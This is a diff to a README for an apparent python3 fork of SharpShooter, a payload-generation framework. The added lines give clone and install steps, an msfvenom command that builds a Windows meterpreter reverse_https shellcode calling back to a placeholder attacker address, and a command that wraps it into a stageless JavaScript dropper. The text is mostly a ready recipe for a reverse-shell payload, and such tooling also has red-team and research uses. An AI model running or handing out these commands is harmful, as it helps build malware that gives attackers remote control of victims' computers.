@@ -1,4 +1,18 @@
-This is the Fork version of Origianl SharpShooter with python3 supported
+# This is the Fork version of Origianl SharpShooter with python3 supported
+## 1. Install and use
+```
+git clone https://github.com/sebastian93921/SharpShooter.git
+cd SharpShooter/
+pip3 install -r requirements.txt
+```
+## 2. Generate payload
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.xx.xx LPORT=443 -f raw -o shell.txt
+```
+## 3. Generate output
+```
+python3 SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile shell.txt --output test
+```
 
 ```
    _____ __                    _____ __                __           
